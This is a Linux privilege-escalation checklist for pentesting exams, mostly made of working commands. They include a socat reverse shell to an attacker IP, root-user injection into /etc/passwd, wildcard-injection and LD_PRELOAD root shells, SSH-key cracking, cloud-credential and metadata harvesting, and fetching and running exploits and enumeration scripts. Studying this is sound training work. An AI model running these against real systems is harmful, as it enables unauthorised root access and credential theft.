# Linux Privilege Escalation Checklist

A stepwise enumeration playbook from "I have a shell as a low-privilege user" to root. Run through the phases in order. Most CRT-difficulty Linux privesc paths are found in Phase 1 or 2.

## Phase 0: Stabilise the Shell

Before anything else, get a stable shell. An unstable shell wastes more time than the stabilisation takes.

```bash
# Method 1: python pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm-256color
stty rows 40 cols 174

# Method 2: socat (if both ends have it - cleanest)
# Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

## Phase 1: Initial Situational Awareness (60 seconds)

Run these immediately on every new Linux foothold. Many privesc paths fall out of these alone.

```bash
# Identity and context
id
whoami
groups
hostname

# OS version (for kernel-exploit decisions)
uname -a
cat /etc/os-release
cat /proc/version

# What does my account look like?
echo $PATH
echo $SHELL
env

# Current working directory
pwd
ls -la
```

**What to look for:**

- [ ] **`id` output** - membership in interesting groups: `sudo`, `wheel`, `admin`, `docker`, `lxd`, `disk`, `shadow`, `adm`, `video`, `plugdev`. Each is a potential privesc path.
- [ ] **`uname -a`** - the kernel version. Note it for Phase 5 (kernel exploits).
- [ ] **`PATH`** - is a writable directory in PATH? If `/home/jdoe/bin` precedes `/usr/bin`, you can shadow standard binaries.

## Phase 2: The Big Five (the 80% paths)

The five techniques that account for most Linux privesc on the CRT and OSCP-style exams. Always check these in order.

### 2.1 sudo -l (the cheapest win)

```bash
sudo -l
```

Read every line of the output:

- [ ] **(root) NOPASSWD: ALL** -> `sudo bash`. Done.
- [ ] **(root) NOPASSWD: <command>** -> look up `<command>` in GTFOBins. Most commands have an escape.
- [ ] **(other_user) <command>** -> can become that user. Useful as stepping stone.
- [ ] **Wildcard arguments** like `sudo /bin/cat /var/log/*` -> wildcard injection: `sudo /bin/cat /var/log/../etc/shadow`.
- [ ] **`env_keep`** allows certain env vars through sudo? Check for `LD_PRELOAD` or `LD_LIBRARY_PATH`. If kept, classic library hijack.
- [ ] **`Defaults !requiretty`** plus a writable script run by sudo - can exploit.

If your account requires a password and you don't know it, try `sudo -l` anyway - sometimes NOPASSWD entries are listed without authentication.

The GTFOBins table for sudo: every binary entry tells you whether sudo'ing that binary gives root. For example:

```
User user may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/vim
```

All three of these give immediate root via GTFOBins entries:

```bash
sudo find . -exec /bin/sh \; -quit
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo vim -c ':!/bin/sh'
```

### 2.2 SUID/SGID Binaries

```bash
# Find SUID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# Find SGID
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm /6000 -type f 2>/dev/null

# Recently-modified SUID (potentially custom and exploitable)
find / -perm -u=s -type f -mtime -30 2>/dev/null
```

**Standard SUID binaries** (probably not exploitable directly):
`/usr/bin/su`, `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/chsh`, `/usr/bin/chfn`, `/usr/bin/gpasswd`, `/usr/bin/newgrp`, `/usr/bin/mount`, `/usr/bin/umount`, `/bin/ping`, `/usr/lib/openssh/ssh-keysign`, `/usr/lib/eject/dmcrypt-get-device`, `/usr/lib/snapd/snap-confine`, `/usr/lib/policykit-1/polkit-agent-helper-1`.

**Anything else** is worth checking against GTFOBins:

- [ ] `bash`, `sh`, `dash`, `zsh` -> `./bash -p`
- [ ] `python`, `python3`, `perl`, `ruby` -> `os.setuid(0); os.system("/bin/bash")` patterns
- [ ] `find`, `awk`, `vim`, `nano`, `less`, `more` -> see GTFOBins
- [ ] `nmap` (older with --interactive)
- [ ] `cp`, `mv`, `tee`, `dd` -> overwrite /etc/passwd or /etc/shadow
- [ ] `cat`, `head`, `tail`, `more`, `less` -> read /etc/shadow
- [ ] `gcc`, `make`, `gdb` -> compile/run code as root
- [ ] **A custom binary you've never heard of** -> investigate it (see Phase 3.4)

The pattern `binary -p` (preserve EUID) is the magic for most SUID exploitation. Try it first.

### 2.3 Capabilities

Capabilities are a finer-grained Linux permission model than SUID. A binary with the right capability can do specific privileged things without being SUID.

```bash
getcap -r / 2>/dev/null
```

The output format is `path/to/binary capability+flags`. The key flags:

- `e` (effective) - active by default
- `i` (inheritable) - propagated to children
- `p` (permitted) - allowed to be raised
- `+ep` is the common dangerous combination

**Critical capabilities** (= effective root):

- [ ] **`cap_setuid+ep`** on `python`, `perl`, `ruby`, `node` -> instant root:
  ```bash
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  perl -e 'use POSIX; setuid(0); exec "/bin/bash"'
  ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
  ```

- [ ] **`cap_setuid+ep`** on `bash` -> `./bash -p`

- [ ] **`cap_dac_read_search+ep`** -> read any file (including /etc/shadow)

- [ ] **`cap_dac_override+ep`** -> write any file (modify /etc/passwd)

- [ ] **`cap_sys_admin+ep`** -> mount filesystems, many other privesc paths (capability-specific)

- [ ] **`cap_sys_ptrace+ep`** -> attach to processes, including root processes

- [ ] **`cap_chown+ep`** -> chown any file (chown /etc/shadow to current user)

**Generally benign capabilities** (don't waste time):
- `cap_net_bind_service+ep` - bind to ports < 1024 (usually no privesc)
- `cap_net_raw+ep` - raw sockets (used by `ping`)
- `cap_setfcap+ep` - set capabilities (sometimes chainable)

### 2.4 Cron Jobs

Cron is the Linux scheduler. Misconfigured cron jobs running as root are a common privesc.

```bash
# System crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Per-user crontabs (if readable)
ls -la /var/spool/cron/crontabs/      # Debian/Ubuntu
ls -la /var/spool/cron/                # CentOS/RHEL
crontab -l                             # current user's
crontab -u root -l 2>/dev/null         # root's (probably denied)

# anacron (if used)
cat /etc/anacrontab
ls -la /var/spool/anacron/

# systemd timers (modern alternative to cron)
systemctl list-timers --all
ls -la /etc/systemd/system/*.timer 2>/dev/null
```

**Look for**:

- [ ] A cron job that **runs a writable script** (any path you can write).
- [ ] A cron job that **runs a script that sources or calls a writable file**.
- [ ] A cron job using a **wildcard expansion** in a directory you can write to (the `tar *` injection - see Section 6).
- [ ] A cron job calling a binary by name (no absolute path) - if the cron's PATH includes a writable directory, you shadow the binary.

**Wait and watch trick**: if you suspect cron is running something but can't see what, monitor:

```bash
# Watch process list for new processes
watch -n 1 'ps -ef --forest'

# Or use pspy to log all process events
./pspy64
```

`pspy` is invaluable - it shows every process exec on the system without root. Often reveals cron jobs you wouldn't otherwise spot.

### 2.5 Writable Files in Sensitive Locations

```bash
# Writable config files
find /etc -writable -type f 2>/dev/null

# /etc/passwd and /etc/shadow
ls -la /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers
ls -la /etc/passwd-              # backup files sometimes world-writable
ls -la /etc/shadow-

# Home directories
find /home -writable -type f 2>/dev/null
find /root -writable -type f 2>/dev/null      # rare but devastating

# Service binaries
find /usr/local/bin /opt -writable -type f 2>/dev/null
find / -path /proc -prune -o -writable -type f -print 2>/dev/null | head -50
```

**The classic writable /etc/passwd**:

```bash
# Generate a hash for "rooted"
openssl passwd -1 -salt salt rooted
# > $1$salt$0E.iHBmDIZprgWGtPSTfg.

# Append to /etc/passwd
echo 'rooted:$1$salt$0E.iHBmDIZprgWGtPSTfg.:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to it
su rooted
# Password: rooted
```

## Phase 3: Process and Service Analysis

### 3.1 Running processes

```bash
# All processes
ps -auxf | less

# Just root processes
ps -ef | grep root

# Network listeners
ss -tunlp                              # modern
netstat -tunlp 2>/dev/null             # if available

# Open files for a specific process
ls -la /proc/<PID>/
cat /proc/<PID>/cmdline
cat /proc/<PID>/environ
```

**Look for**:
- [ ] Root processes running scripts in writable paths
- [ ] Local services bound to 127.0.0.1 only - these aren't reachable externally and often have weaker auth
- [ ] Custom services - investigate the binary

### 3.2 Internal-only services

When you see a service bound to localhost (`127.0.0.1:8080`), it's probably:
- A backend you couldn't reach from the network
- Often runs as root or with weak auth
- Forward the port via your existing access:

```bash
# SSH local forward
ssh -L 8080:127.0.0.1:8080 user@victim

# socat forward
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:8080 &
```

### 3.3 Service binaries

```bash
# systemd services
ls -la /etc/systemd/system/
ls -la /lib/systemd/system/
systemctl list-units --type=service --state=running

# Find writable .service files
find /etc/systemd -writable -type f 2>/dev/null
find /lib/systemd -writable -type f 2>/dev/null

# Initd services (older)
ls -la /etc/init.d/
ls -la /etc/rc*.d/
```

If a `.service` file is writable, change `ExecStart=` to your payload and trigger `systemctl restart <service>` or wait for boot.

### 3.4 Custom SUID Binary Analysis

When you find a non-default SUID binary, investigate before assuming GTFOBins doesn't apply:

```bash
# What does it do?
file /path/to/binary
strings /path/to/binary | head -50
strings /path/to/binary | grep -E "^/|^[a-z]+\b"   # paths and command-like strings

# What does it call?
ltrace /path/to/binary 2>&1 | grep -E "system|exec"
strace /path/to/binary 2>&1 | grep -E "execve|open"
```

Look for:

- [ ] Calls to `system()` with relative paths -> PATH hijacking
- [ ] Hardcoded absolute paths to writable scripts
- [ ] Reads from environment variables -> environment manipulation
- [ ] Reads from configuration files in writable directories

**PATH hijacking example**:

```bash
# strings shows: system("date")
# Means the SUID binary calls /bin/sh -c "date"
# We can shadow `date`:

mkdir /tmp/hijack
echo '#!/bin/bash' > /tmp/hijack/date
echo '/bin/bash -p' >> /tmp/hijack/date
chmod +x /tmp/hijack/date

export PATH=/tmp/hijack:$PATH
/path/to/suid_binary
# Now /tmp/hijack/date runs first, gets root via SUID context
```

## Phase 4: Stored Credentials Hunt

Often a password somewhere on the box unlocks root or another user's account. Search systematically:

### 4.1 Configuration files

```bash
# Recursive grep for passwords (limited to likely paths)
grep -r -E -i "passw[o0]rd|secret|api[_-]?key|token" /etc /var/www /opt 2>/dev/null | grep -v "\.gz:" | head -50

# WordPress / web app configs
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "configuration.php" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "settings.py" 2>/dev/null
find / -name "database.yml" 2>/dev/null
find / -name "application.properties" 2>/dev/null

# Service configs that may have passwords
cat /etc/mysql/my.cnf 2>/dev/null
cat /etc/mysql/mariadb.conf.d/* 2>/dev/null
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
cat /etc/openvpn/*.conf 2>/dev/null
cat /etc/strongswan.conf 2>/dev/null
cat /etc/fstab 2>/dev/null               # mount credentials sometimes here
cat /etc/proftpd/proftpd.conf 2>/dev/null
cat /etc/vsftpd.conf 2>/dev/null
```

### 4.2 SSH keys and authorized_keys

```bash
# Find any SSH keys
find / -name "id_rsa*" 2>/dev/null
find / -name "id_ed25519*" 2>/dev/null
find / -name "id_dsa*" 2>/dev/null
find / -name "id_ecdsa*" 2>/dev/null

# authorized_keys - shows where this user can log in elsewhere
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null

# SSH config (often has aliases pointing to internal hosts)
cat ~/.ssh/config
find / -name ".ssh" -type d 2>/dev/null
```

If you find an SSH private key:

```bash
# Try to use it
ssh -i found_key user@target

# If it has a passphrase, crack it
ssh2john found_key > found.hash
john --wordlist=/usr/share/wordlists/rockyou.txt found.hash
# Or hashcat (mode 22921 for newer keys)
hashcat -m 22921 found.hash /usr/share/wordlists/rockyou.txt
```

### 4.3 Bash history and shell history

```bash
# Current user
cat ~/.bash_history
cat ~/.zsh_history

# Other users (if readable)
find / -name ".bash_history" 2>/dev/null | xargs ls -la 2>/dev/null
find / -name ".bash_history" 2>/dev/null | xargs cat 2>/dev/null

# Database CLI histories
find / -name ".mysql_history" 2>/dev/null | xargs cat 2>/dev/null
find / -name ".python_history" 2>/dev/null | xargs cat 2>/dev/null
find / -name ".sqlite_history" 2>/dev/null | xargs cat 2>/dev/null

# Less, vim, nano histories
find / -name ".lesshst" 2>/dev/null
find / -name ".viminfo" 2>/dev/null
```

### 4.4 Cloud credentials

```bash
# AWS
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null

# Azure
ls ~/.azure/ 2>/dev/null
cat ~/.azure/credentials 2>/dev/null

# GCP
cat ~/.config/gcloud/credentials.db 2>/dev/null
ls ~/.config/gcloud/ 2>/dev/null

# Docker
cat ~/.docker/config.json 2>/dev/null

# Kubernetes
cat ~/.kube/config 2>/dev/null

# IAM role from instance metadata (if on cloud)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
```

### 4.5 Database files

```bash
# SQLite databases
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | head -20

# Inspect each
sqlite3 /path/to/db.sqlite ".dump"
sqlite3 /path/to/db.sqlite ".tables"
```

### 4.6 Backup files

```bash
# Common backup extensions
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*.orig" 2>/dev/null
find / -name "*.swp" 2>/dev/null              # vim swap files
find / -name "*~" 2>/dev/null                  # editor backup
find / -name "*.tar*" 2>/dev/null | head
find / -name "*.zip" 2>/dev/null | head
```

## Phase 5: Group-Based Privesc

Specific group memberships grant effective root:

### 5.1 docker group

```bash
# Verify membership
id | grep docker

# Mount host filesystem and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or with any image
docker images
docker run --rm -it -v /:/host ubuntu chroot /host /bin/bash

# Privileged with host network
docker run --rm -it --privileged --network host -v /:/host alpine chroot /host
```

### 5.2 lxd / lxc group

```bash
# Verify
id | grep lxd

# Build a small image (or use existing)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
lxc image import ./alpine-*.tar.gz --alias myimg

# Init container with privileged mode
lxc init myimg ignite -c security.privileged=true
lxc config device add ignite mydev disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite -- /bin/sh
chroot /mnt/root /bin/bash
```

### 5.3 disk group

```bash
# disk group = read/write block devices
ls -la /dev/sda*

# Use debugfs to read inodes including /etc/shadow
debugfs /dev/sda1
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa
```

### 5.4 shadow / adm groups

```bash
# adm group = read /var/log
# shadow group = read /etc/shadow
cat /etc/shadow                       # try - sometimes group-readable
```

Then crack the hashes (Phase 4 of the AD methodology applies similarly).

### 5.5 video group

```bash
# Sometimes lets you read /dev/fb0 (framebuffer) - take screenshot of root's session
# Less commonly direct privesc; more often information disclosure.
```

## Phase 6: Cron / Wildcard Injection

When you find a cron job using a wildcard in a writable directory, exploit via the wildcard:

### 6.1 tar wildcard injection

Cron entry: `* * * * * cd /var/backups && tar czf backup.tar.gz *`

If `/var/backups` (or whatever the cron uses) is writable:

```bash
cd /var/backups
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > exploit.sh
chmod +x exploit.sh
touch -- '--checkpoint-action=exec=sh exploit.sh'
touch -- '--checkpoint=1'

# Wait for cron, then
/tmp/rb -p
# uid=1000 euid=0 - root
```

### 6.2 chown wildcard injection

Cron: `chown -R user:user /var/log/*`

```bash
# --reference takes priority over the listed files
echo > /var/log/--reference=/etc/shadow
# When chown runs, it chowns shadow to "user:user"
```

### 6.3 rsync wildcard injection

Cron: `rsync -e ssh src/* user@host:dst/`

```bash
# -e specifies remote shell
touch -- '-e sh exploit.sh'
echo '/bin/sh' > exploit.sh
```

## Phase 7: Library Loading Tricks

### 7.1 LD_PRELOAD (when sudo preserves it)

```bash
# Check if sudo keeps LD_PRELOAD
sudo -l | grep -i preload     # look for env_keep+="LD_PRELOAD"
```

If yes:

```c
// preload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so <any sudo-allowed command>
```

### 7.2 LD_LIBRARY_PATH hijacking

If a SUID binary loads a library via name (not absolute path) AND a writable directory comes first in LD_LIBRARY_PATH (which usually requires sudo env_keep on modern systems), drop a malicious library.

### 7.3 RPATH/RUNPATH abuse

```bash
# Check binary's embedded library path
readelf -d /path/to/binary | grep -E "RPATH|RUNPATH"
```

If the path includes a writable directory, drop a malicious library with the same name as a legitimate dependency.

```bash
# What libraries does it load?
ldd /path/to/binary
```

## Phase 8: NFS Misconfigurations

If NFS shares are exported without `root_squash`, you can become root on the share from any host where you have root locally.

```bash
# What shares does this host export?
showmount -e localhost 2>/dev/null
cat /etc/exports

# What is mounted?
mount | grep nfs
```

If you can reach an NFS server with `no_root_squash`:

```bash
# On a host where you ARE root (your Kali)
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <server>:/export /mnt/nfs

# Drop a SUID root binary on the share
sudo cp /bin/bash /mnt/nfs/.rootbash
sudo chmod +s /mnt/nfs/.rootbash

# On the target (where you're a non-root user but the share is mounted)
ls -la /shared_path/.rootbash      # should show -rwsr-xr-x root root
/shared_path/.rootbash -p
# Now euid=0
```

## Phase 9: Kernel Exploits

Last resort. Kernel exploits are often unreliable, can crash the box, and require uploading and compiling code. Use only when Phases 1-8 have failed.

### 9.1 Check known major exploits

```bash
# Get kernel version
uname -r
# E.g. 5.4.0-104-generic

# Distro and version
cat /etc/os-release
```

Match against the known major exploits:

| CVE | Name | Kernel range | Mechanism |
|---|---|---|---|
| CVE-2021-4034 | **PwnKit** | All Linux pre-Jan 2022 | Polkit `pkexec` argv handling - check `ls -la /usr/bin/pkexec` for SUID |
| CVE-2022-0847 | **Dirty Pipe** | 5.8 to 5.16.11, 5.15.25, 5.10.102 | Pipe splice - overwrite read-only files |
| CVE-2016-5195 | **Dirty COW** | 2.6.22 to 4.8 | COW race - older kernels |
| CVE-2021-3156 | **Baron Samedit** | sudo 1.8.2 - 1.9.5p1 | sudo heap overflow |
| CVE-2021-33909 | **Sequoia** | most pre-mid-2021 kernels | filesystem layer overflow |
| CVE-2021-3493 | **OverlayFS** | various Ubuntu | OverlayFS misconfig |
| CVE-2021-3560 | (PolKit) | 7-year-old Polkit | D-Bus race condition |

### 9.2 PwnKit (CVE-2021-4034) - the universal one

```bash
# Test for vulnerability
ls -la /usr/bin/pkexec
# If SUID exists and kernel is pre-Jan 2022 patches, vulnerable

# Standalone exploit (in /usr/share/exploitdb on Kali)
searchsploit pwnkit
# Or download from https://github.com/berdav/CVE-2021-4034

# Compile and run on victim
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
# whoami -> root
```

### 9.3 linux-exploit-suggester

```bash
# Download to victim
wget https://github.com/mzet-/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

It scores each potential exploit against the kernel and lists those most likely applicable.

## Phase 10: The Auto-Enumeration Tools

When time permits, run these. They check everything in the phases above and more.

### 10.1 LinPEAS (the gold standard)

```bash
# Download to victim
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
chmod +x linpeas.sh

# Run
./linpeas.sh

# Save output for review
./linpeas.sh > /tmp/linpeas_out.txt

# Quick mode (skips slow checks)
./linpeas.sh -s
```

Pay attention to colour-coded findings:
- **Red** = highly likely privesc
- **Red/Yellow** = likely privesc, deserves investigation
- **Yellow** = potentially interesting

### 10.2 LinEnum

```bash
wget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t -e /tmp -r report.txt
```

### 10.3 pspy (process monitoring without root)

```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

chmod +x pspy64
./pspy64
```

Watches every process exec. Reveals cron jobs, daemons, and ad-hoc privileged processes. Run it for 1-2 minutes minimum.

## Methodology Summary

In order of likelihood and effort:

1. **`sudo -l`** (cheapest)
2. **SUID binaries** (`find / -perm -u=s -type f`)
3. **Capabilities** (`getcap -r /`)
4. **Cron** (`/etc/crontab`, cron directories)
5. **Writable sensitive files** (`/etc/passwd`, scripts run by root)
6. **Group-based** (docker, lxd, disk)
7. **Stored credentials** (configs, .bash_history, SSH keys)
8. **NFS no_root_squash**
9. **PwnKit / kernel exploits**

Run linpeas at any point - it covers most of the above automatically.

The CRT exam is unlikely to require obscure techniques. Most Linux privesc paths on the exam are findable through `sudo -l` plus SUID enumeration plus a glance at `getcap`. If you've spent more than 20 minutes without progress, run linpeas and let it find what you missed.
